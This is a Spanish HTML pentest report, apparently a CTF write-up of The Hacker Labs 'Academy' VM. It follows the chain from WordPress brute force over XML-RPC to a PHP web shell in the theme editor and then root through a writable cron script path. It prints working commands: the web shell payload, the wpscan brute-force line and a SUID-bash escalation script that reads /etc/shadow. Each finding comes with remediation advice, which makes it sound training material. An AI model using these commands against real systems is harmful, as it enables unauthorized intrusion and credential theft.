@@ -1,0 +1,312 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<style>html,body{margin:0}img{max-width:100%}[hidden]{display:none!important}</style>
+<title>Academy · Informe Pentest</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+  /* Layout: franjas a todo el ancho con wrapper interior de 960px; tarjetas de hallazgo apiladas */
+  :root{
+    --bg:#f4f6f8; --surface:#ffffff; --surface-2:#eef1f4; --border:#d8dee6;
+    --fg:#141a21; --fg-muted:#5b6673; --accent:#0d7d8c; --accent-soft:#d3ebee;
+    --crit:#c62a2f; --high:#d9620a; --med:#b8860b; --low:#2f7d4a; --info:#5b6673;
+    --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,monospace;
+    --sans:"Inter",system-ui,-apple-system,sans-serif;
+    --display:"Space Grotesk",var(--sans);
+  }
+  @media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+    --bg:#0d1117; --surface:#161b22; --surface-2:#1c232d; --border:#2a333f;
+    --fg:#e6edf3; --fg-muted:#9aa7b4; --accent:#3bc4d6; --accent-soft:#122d33;
+    --crit:#ff6b6e; --high:#ff9a4d; --med:#e8c35a; --low:#5fd38a; --info:#9aa7b4;
+    color-scheme:dark;
+  }}
+  :root[data-theme="dark"]{
+    --bg:#0d1117; --surface:#161b22; --surface-2:#1c232d; --border:#2a333f;
+    --fg:#e6edf3; --fg-muted:#9aa7b4; --accent:#3bc4d6; --accent-soft:#122d33;
+    --crit:#ff6b6e; --high:#ff9a4d; --med:#e8c35a; --low:#5fd38a; --info:#9aa7b4;
+    color-scheme:dark;
+  }
+  *{box-sizing:border-box}
+  body{background:var(--bg);color:var(--fg);font-family:var(--sans);line-height:1.6;font-size:15px}
+  .wrap{max-width:960px;margin-inline:auto;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
+  h1,h2,h3{font-family:var(--display);line-height:1.2;text-wrap:balance;margin:0}
+  h2{font-size:1.5rem;font-weight:600;margin-bottom:.35rem}
+  h3{font-size:1.1rem;font-weight:600}
+  p{margin:.5rem 0}
+  a{color:var(--accent)}
+  code,kbd{font-family:var(--mono);font-size:.86em}
+  section{padding-block:2.4rem;border-bottom:1px solid var(--border)}
+  .eyebrow{font-family:var(--mono);font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.9rem}
+
+  /* Hero */
+  .hero{background:linear-gradient(135deg,#0d1117 0%,#102a30 100%);color:#e6edf3;
+    margin-top:calc(-1 * env(safe-area-inset-top,0px));
+    padding-top:calc(env(safe-area-inset-top,0px) + 2.6rem);padding-bottom:2.6rem;border-bottom:1px solid var(--border)}
+  .hero .eyebrow{color:#3bc4d6}
+  .hero h1{font-size:clamp(2rem,6vw,3rem);font-weight:700;color:#fff;margin-bottom:.4rem}
+  .hero .sub{color:#9aa7b4;font-size:1.05rem;max-width:60ch}
+  .hero .meta{display:flex;flex-wrap:wrap;gap:.5rem 1.6rem;margin-top:1.4rem;font-family:var(--mono);font-size:.8rem;color:#9aa7b4}
+  .hero .meta b{color:#e6edf3;font-weight:500}
+  .pwn{display:inline-flex;align-items:center;gap:.5rem;margin-top:1.5rem;padding:.5rem .95rem;border:1px solid #ff6b6e;border-radius:999px;color:#ff8a8c;font-family:var(--mono);font-size:.8rem;letter-spacing:.08em}
+  .pwn::before{content:"";width:8px;height:8px;border-radius:50%;background:#ff6b6e;box-shadow:0 0 10px #ff6b6e}
+
+  /* Chips de severidad */
+  .chip{display:inline-flex;align-items:center;font-family:var(--mono);font-size:.68rem;font-weight:500;letter-spacing:.06em;text-transform:uppercase;padding:.2rem .5rem;border-radius:5px;border:1px solid;white-space:nowrap}
+  .sev-crit{color:var(--crit);border-color:var(--crit);background:color-mix(in srgb,var(--crit) 12%,transparent)}
+  .sev-high{color:var(--high);border-color:var(--high);background:color-mix(in srgb,var(--high) 12%,transparent)}
+  .sev-med{color:var(--med);border-color:var(--med);background:color-mix(in srgb,var(--med) 12%,transparent)}
+  .sev-low{color:var(--low);border-color:var(--low);background:color-mix(in srgb,var(--low) 12%,transparent)}
+
+  /* Resumen: tiles */
+  .tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:.8rem;margin-top:1.3rem}
+  .tile{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1rem}
+  .tile .n{font-family:var(--display);font-size:1.9rem;font-weight:700;font-variant-numeric:tabular-nums;line-height:1}
+  .tile .l{font-size:.78rem;color:var(--fg-muted);margin-top:.35rem}
+
+  /* Tabla de hallazgos */
+  .tbl-scroll{overflow-x:auto;margin-top:1.2rem;border:1px solid var(--border);border-radius:10px}
+  table{border-collapse:collapse;width:100%;min-width:560px;font-size:.88rem}
+  th,td{text-align:left;padding:.65rem .8rem;border-bottom:1px solid var(--border);vertical-align:top}
+  th{font-family:var(--mono);font-size:.7rem;letter-spacing:.08em;text-transform:uppercase;color:var(--fg-muted);background:var(--surface-2)}
+  tr:last-child td{border-bottom:none}
+  td .cvss{font-family:var(--mono);font-size:.74rem;color:var(--fg-muted)}
+
+  /* Grid de contexto */
+  .grid2{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:.8rem;margin-top:1.2rem}
+  .info-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1rem 1.1rem}
+  .info-card h3{font-size:.82rem;font-family:var(--mono);text-transform:uppercase;letter-spacing:.08em;color:var(--accent);margin-bottom:.6rem}
+  .kv{display:flex;justify-content:space-between;gap:1rem;padding:.25rem 0;border-bottom:1px dashed var(--border);font-size:.86rem}
+  .kv:last-child{border-bottom:none}
+  .kv span:first-child{color:var(--fg-muted)}
+  .kv span:last-child{font-family:var(--mono);text-align:right;min-width:0;word-break:break-word}
+
+  /* Cadena de ataque */
+  .chain{list-style:none;padding:0;margin:1.3rem 0 0;counter-reset:step}
+  .chain li{position:relative;padding:0 0 1.3rem 2.6rem;counter-increment:step}
+  .chain li::before{content:counter(step);position:absolute;left:0;top:0;width:1.7rem;height:1.7rem;border-radius:50%;background:var(--accent);color:#fff;font-family:var(--mono);font-size:.8rem;font-weight:600;display:grid;place-items:center}
+  .chain li:not(:last-child)::after{content:"";position:absolute;left:.82rem;top:1.9rem;bottom:0;width:2px;background:var(--border)}
+  .chain h3{font-size:.98rem;margin-bottom:.15rem}
+  .chain p{margin:.1rem 0;color:var(--fg-muted);font-size:.9rem}
+
+  /* Tarjetas de hallazgo detallado */
+  .finding{background:var(--surface);border:1px solid var(--border);border-left:4px solid var(--border);border-radius:10px;padding:1.2rem 1.3rem;margin-top:1.1rem}
+  .finding.c{border-left-color:var(--crit)} .finding.h{border-left-color:var(--high)}
+  .finding.m{border-left-color:var(--med)} .finding.l{border-left-color:var(--low)}
+  .finding-head{display:flex;flex-wrap:wrap;align-items:center;gap:.6rem;margin-bottom:.2rem}
+  .finding-head .id{font-family:var(--mono);color:var(--fg-muted);font-size:.8rem}
+  .finding-head h3{flex:1;min-width:200px}
+  .finding dl{display:grid;grid-template-columns:auto 1fr;gap:.3rem 1rem;margin:.8rem 0 0;font-size:.9rem}
+  .finding dt{color:var(--fg-muted);font-family:var(--mono);font-size:.76rem;text-transform:uppercase;letter-spacing:.05em;padding-top:.15rem}
+  .finding dd{margin:0;min-width:0}
+  pre{background:var(--surface-2);border:1px solid var(--border);border-radius:8px;padding:.8rem 1rem;overflow-x:auto;font-family:var(--mono);font-size:.82rem;line-height:1.5;margin:.7rem 0 0}
+  pre code{color:var(--fg)}
+  .fix{margin-top:.8rem;padding:.7rem .9rem;background:var(--accent-soft);border-radius:8px;font-size:.88rem}
+  .fix b{color:var(--accent)}
+
+  ul.clean{margin:.5rem 0;padding-left:1.2rem}
+  ul.clean li{margin:.3rem 0}
+  .redacted{filter:blur(0);font-family:var(--mono)}
+  footer{padding-block:2rem;color:var(--fg-muted);font-size:.8rem}
+  .disclaimer{background:var(--surface-2);border:1px solid var(--border);border-radius:8px;padding:.8rem 1rem;font-size:.82rem;color:var(--fg-muted);margin-top:1.2rem}
+</style>
+</head>
+<body>
+<section class="hero">
+  <div class="wrap">
+    <div class="eyebrow">Informe de Test de Intrusión · Laboratorio autorizado</div>
+    <h1>Academy</h1>
+    <p class="sub">Caja CTF de The Hacker Labs evaluada en homelab VMware propio. Del descubrimiento de red a la ejecución de código como <code>root</code>, documentando cada decisión.</p>
+    <div class="meta">
+      <span><b>Objetivo:</b> 192.168.20.132</span>
+      <span><b>Host vhost:</b> academy.thl</span>
+      <span><b>Atacante:</b> 192.168.20.131 (Kali)</span>
+      <span><b>Fecha:</b> 24 nov 2026</span>
+    </div>
+    <div class="pwn">COMPROMISO TOTAL — ACCESO ROOT</div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <div class="eyebrow">01 · Resumen ejecutivo</div>
+    <h2>Un servidor web público llevó a control total</h2>
+    <p>El objetivo expone únicamente SSH y un servidor web Apache. Dentro del sitio web vive una instalación de WordPress protegida solo por una contraseña débil. A partir de ahí, una cadena de cuatro pasos encadenados permitió a un atacante sin credenciales previas pasar de <em>no tener nada</em> a <em>controlar la máquina por completo</em>, leyendo el fichero de contraseñas del sistema y ambas <em>flags</em>.</p>
+    <p>El punto crítico no fue un exploit exótico, sino una suma de malas prácticas corrientes: una contraseña adivinable, un panel de administración que permite editar código, y una tarea programada del sistema que ejecuta como <code>root</code> un script desde un directorio que el servidor web puede modificar.</p>
+    <div class="tiles">
+      <div class="tile"><div class="n" style="color:var(--crit)">1</div><div class="l">Crítico</div></div>
+      <div class="tile"><div class="n" style="color:var(--high)">2</div><div class="l">Altos</div></div>
+      <div class="tile"><div class="n" style="color:var(--med)">3</div><div class="l">Medios</div></div>
+      <div class="tile"><div class="n">2</div><div class="l">Puertos abiertos</div></div>
+      <div class="tile"><div class="n">root</div><div class="l">Nivel alcanzado</div></div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <div class="eyebrow">02 · Alcance y entorno</div>
+    <h2>Qué se evaluó</h2>
+    <div class="grid2">
+      <div class="info-card">
+        <h3>Objetivo</h3>
+        <div class="kv"><span>IP</span><span>192.168.20.132</span></div>
+        <div class="kv"><span>MAC / OUI</span><span>00:0C:29 (VMware guest)</span></div>
+        <div class="kv"><span>SO</span><span>Debian 12 (Linux)</span></div>
+        <div class="kv"><span>vhost web</span><span>academy.thl</span></div>
+      </div>
+      <div class="info-card">
+        <h3>Superficie expuesta</h3>
+        <div class="kv"><span>22/tcp</span><span>OpenSSH 9.2p1</span></div>
+        <div class="kv"><span>80/tcp</span><span>Apache 2.4.59</span></div>
+        <div class="kv"><span>App</span><span>WordPress 6.5.3</span></div>
+        <div class="kv"><span>Plugin</span><span>wp-file-manager 6.5.1</span></div>
+      </div>
+    </div>
+    <div class="disclaimer">Prueba realizada por el propietario del laboratorio sobre una máquina virtual de CTF descargada, en una red privada aislada. Sin impacto sobre terceros. <strong>Las flags se omiten deliberadamente</strong> para no estropear el reto a otras personas; este documento prioriza la metodología, no el spoiler.</div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <div class="eyebrow">03 · Hallazgos</div>
+    <h2>Resumen priorizado</h2>
+    <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>ID</th><th>Hallazgo</th><th>Sev.</th><th>CVSS 3.1</th></tr></thead>
+        <tbody>
+          <tr><td>F-01</td><td>RCE autenticado vía editor de temas de WordPress</td><td><span class="chip sev-crit">Crítico</span></td><td class="cvss">9.1 · AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H</td></tr>
+          <tr><td>F-02</td><td>Escalada a root: cron ejecuta script ausente en directorio escribible</td><td><span class="chip sev-high">Alto</span></td><td class="cvss">7.8 · AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</td></tr>
+          <tr><td>F-03</td><td>Credenciales WordPress débiles sin límite de intentos (XML-RPC)</td><td><span class="chip sev-high">Alto</span></td><td class="cvss">7.5 · AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</td></tr>
+          <tr><td>F-04</td><td>Credenciales en texto claro embebidas en <code>/opt/backup.py</code></td><td><span class="chip sev-med">Medio</span></td><td class="cvss">5.5 · AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</td></tr>
+          <tr><td>F-05</td><td>Plugin wp-file-manager 6.5.1 desactualizado</td><td><span class="chip sev-med">Medio</span></td><td class="cvss">6.1 · superficie de RCE conocida</td></tr>
+          <tr><td>F-06</td><td>Fugas de información: listado de directorios, readme, XML-RPC</td><td><span class="chip sev-med">Medio</span></td><td class="cvss">5.3 · AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <div class="eyebrow">04 · Cadena de ataque</div>
+    <h2>De cero a root en seis pasos</h2>
+    <ol class="chain">
+      <li><h3>Descubrimiento de red</h3><p>Barrido ARP/ICMP de 192.168.20.0/24. El OUI <code>00:0C:29</code> delata una VM invitada de VMware frente a la infraestructura <code>00:50:56</code>. Objetivo vivo: <code>.132</code>.</p></li>
+      <li><h3>Enumeración de servicios</h3><p>Escaneo completo de puertos: solo 22 y 80 abiertos. En el 80, un Apache por defecto esconde <code>/wordpress/</code>. La cabecera <code>Link</code> de wp-json revela el vhost <code>academy.thl</code>.</p></li>
+      <li><h3>Enumeración de WordPress</h3><p><code>wpscan</code> identifica WordPress 6.5.3, el usuario <code>dylan</code> y el plugin file-manager. XML-RPC está habilitado.</p></li>
+      <li><h3>Acceso: fuerza bruta</h3><p>Fuerza bruta vía <code>system.multicall</code> de XML-RPC contra <code>dylan</code> con rockyou. Sin límite de intentos: <code>dylan:password1</code> en segundos → acceso de administrador.</p></li>
+      <li><h3>Ejecución de código (RCE)</h3><p>Como admin, se inyecta PHP en el editor de temas (<code>functions.php</code> de twentytwentytwo). Shell web ejecutando como <code>www-data</code> bajo Apache.</p></li>
+      <li><h3>Escalada a root</h3><p>Un cron de <code>root</code> intenta ejecutar <code>/opt/backup.sh</code>, que <em>no existe</em>, en un directorio propiedad de <code>www-data</code>. Creamos ese script → <code>root</code> copia <code>bash</code> con SUID y vuelca ambas flags. <strong>Game over.</strong></p></li>
+    </ol>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <div class="eyebrow">05 · Hallazgos en detalle</div>
+    <h2>Análisis técnico y remediación</h2>
+
+    <div class="finding c">
+      <div class="finding-head"><span class="id">F-01</span><h3>RCE autenticado vía editor de temas</h3><span class="chip sev-crit">Crítico</span></div>
+      <p>WordPress permite a un administrador editar los ficheros PHP del tema activo desde el propio panel. Al ser PHP ejecutable por el servidor, esto equivale a ejecución remota de código arbitrario.</p>
+      <dl>
+        <dt>Vector</dt><dd>Escribir <code>&lt;?php system($_GET['cmd']); ?&gt;</code> en <code>functions.php</code> del tema vía <code>admin-ajax.php</code> (acción <code>edit-theme-plugin-file</code>), usando un nonce fresco.</dd>
+        <dt>Impacto</dt><dd>Ejecución de comandos como <code>www-data</code>; pivote directo al sistema operativo.</dd>
+      </dl>
+      <pre><code>curl -sG "http://academy.thl/wordpress/wp-content/themes/twentytwentytwo/functions.php" \
+     --data-urlencode "cmd=id"
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+      <div class="fix"><b>Remediación:</b> definir <code>DISALLOW_FILE_EDIT</code> y <code>DISALLOW_FILE_MODS</code> en <code>wp-config.php</code>; el servidor web no debe tener permiso de escritura sobre el código de la aplicación.</div>
+    </div>
+
+    <div class="finding h">
+      <div class="finding-head"><span class="id">F-02</span><h3>Escalada a root: cron + directorio escribible + script ausente</h3><span class="chip sev-high">Alto</span></div>
+      <p>Una tarea programada de <code>root</code> ejecuta periódicamente <code>/opt/backup.sh</code>. Ese fichero no existe, pero el directorio <code>/opt</code> es propiedad de <code>www-data</code> (<code>drwxr-xr-x www-data root</code>), así que el usuario web puede crearlo. Al siguiente ciclo, <code>root</code> ejecuta nuestro código.</p>
+      <dl>
+        <dt>Descubrimiento</dt><dd>En un escenario real, <code>pspy64</code> revela sin privilegios qué binario lanza <code>root</code> — aquí, <code>/opt/backup.sh</code>, no el <code>backup.py</code> visible que despistaba.</dd>
+        <dt>Técnica</dt><dd>SUID sobre una copia de <code>bash</code> en <code>/opt</code> (no en <code>/dev/shm</code>, montado <code>noexec</code>). <code>/opt/rootbash -p</code> → euid=0.</dd>
+      </dl>
+      <pre><code># /opt/backup.sh creado por www-data, ejecutado por root:
+cp /bin/bash /opt/rootbash
+chmod 4755 /opt/rootbash
+cat /root/root.txt &gt; /dev/shm/root.txt
+# Luego, como www-data:
+/opt/rootbash -p -c 'id; cat /etc/shadow'
+# uid=33(www-data) euid=0(root)  ← root</code></pre>
+      <div class="fix"><b>Remediación:</b> los directorios y scripts que ejecuta <code>root</code> deben pertenecer a <code>root</code> y no ser escribibles por otros (<code>chown root:root /opt</code>, <code>chmod 755</code>). Nunca ejecutar desde cron rutas controlables por servicios menos privilegiados; usar rutas absolutas a binarios validados.</div>
+    </div>
+
+    <div class="finding h">
+      <div class="finding-head"><span class="id">F-03</span><h3>Credenciales débiles sin límite de intentos</h3><span class="chip sev-high">Alto</span></div>
+      <p>El usuario <code>dylan</code> usa <code>password1</code>, presente en cualquier diccionario. XML-RPC (<code>system.multicall</code>) permite probar decenas de contraseñas por petición sin bloqueo ni CAPTCHA.</p>
+      <pre><code>wpscan --url http://academy.thl/wordpress/ --usernames dylan \
+       --passwords rockyou.txt --password-attack xmlrpc --max-threads 50
+# [!] Valid Combinations Found:  dylan / password1   (82 peticiones, 10 s)</code></pre>
+      <div class="fix"><b>Remediación:</b> política de contraseñas robustas + 2FA; limitar o deshabilitar <code>xmlrpc.php</code>; rate-limiting y bloqueo tras N fallos (p. ej. Fail2ban/WAF).</div>
+    </div>
+
+    <div class="finding m">
+      <div class="finding-head"><span class="id">F-04</span><h3>Credenciales en texto claro en <code>/opt/backup.py</code></h3><span class="chip sev-med">Medio</span></div>
+      <p>El script original contenía credenciales SSH embebidas (<code>dylan:dylan123</code> hacia un host hoy inexistente). Secretos en código son reutilizables y sobreviven a rotaciones.</p>
+      <div class="fix"><b>Remediación:</b> mover secretos a un gestor (vault) o variables de entorno con permisos restringidos; rotar cualquier credencial expuesta.</div>
+    </div>
+
+    <div class="finding m">
+      <div class="finding-head"><span class="id">F-05</span><h3>Plugin wp-file-manager 6.5.1 desactualizado</h3><span class="chip sev-med">Medio</span></div>
+      <p>La versión instalada está fuera de soporte. La familia wp-file-manager acumula vulnerabilidades críticas de subida/RCE (p. ej. CVE-2020-25213). Aun sin explotarse aquí, es una segunda vía de entrada latente.</p>
+      <div class="fix"><b>Remediación:</b> actualizar o retirar el plugin; mantener core, temas y plugins al día.</div>
+    </div>
+
+    <div class="finding m">
+      <div class="finding-head"><span class="id">F-06</span><h3>Fugas de información</h3><span class="chip sev-med">Medio</span></div>
+      <p>Listado de directorios habilitado (<code>/wp-content/uploads/</code>, temas), <code>readme.html</code> expone la versión exacta, y XML-RPC está abierto. Facilitan el reconocimiento al atacante.</p>
+      <div class="fix"><b>Remediación:</b> desactivar <code>Options Indexes</code> en Apache, borrar <code>readme.html</code>, restringir XML-RPC y wp-cron externo.</div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <div class="eyebrow">06 · Recomendaciones</div>
+    <h2>Prioridades de remediación</h2>
+    <ul class="clean">
+      <li><strong>Inmediato —</strong> corregir permisos de <code>/opt</code> (dueño <code>root</code>, no escribible por el servicio web): rompe la escalada a root por sí solo.</li>
+      <li><strong>Inmediato —</strong> contraseña fuerte para <code>dylan</code> + bloqueo de <code>xmlrpc.php</code>: cierra la puerta de entrada.</li>
+      <li><strong>Corto plazo —</strong> <code>DISALLOW_FILE_EDIT</code> en WordPress y revocar la escritura del servidor web sobre su propio código.</li>
+      <li><strong>Corto plazo —</strong> actualizar WordPress, temas y plugins; retirar wp-file-manager si no se usa.</li>
+      <li><strong>Higiene —</strong> eliminar secretos del código, desactivar listados de directorios y banners de versión.</li>
+    </ul>
+    <p style="margin-top:1rem;color:var(--fg-muted)">Defensa en profundidad: ninguno de estos fallos es, por separado, un desastre; su <em>encadenamiento</em> es lo que lleva a root. Romper un solo eslabón habría detenido la cadena.</p>
+  </div>
+</section>
+
+<section style="border-bottom:none">
+  <div class="wrap">
+    <div class="eyebrow">Apéndice · Loot</div>
+    <h2>Evidencias recogidas</h2>
+    <div class="grid2">
+      <div class="info-card">
+        <h3>Flags</h3>
+        <div class="kv"><span>user.txt</span><span>capturada ✓</span></div>
+        <div class="kv"><span>root.txt</span><span>capturada ✓</span></div>
+        <div class="kv"><span>Valores</span><span>omitidos (anti-spoiler)</span></div>
+      </div>
+      <div class="info-card">
+        <h3>Credenciales</h3>
+        <div class="kv"><span>WP admin</span><span>dylan : password1</span></div>
+        <div class="kv"><span>DB (wp-config)</span><span>wordpressuser : t9sH…GXZS</span></div>
+      </div>
+    </div>
+    <p style="margin-top:1rem;color:var(--fg-muted);font-size:.85rem">Hashes de <code>/etc/shadow</code> (root, debian) y ficheros de scan archivados en el dossier local junto a este informe.</p>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    The Hacker Labs · Academy — Informe de pentest con fines educativos · Laboratorio propio autorizado · 24 nov 2026
+  </div>
+</footer>
+</body>
+</html>
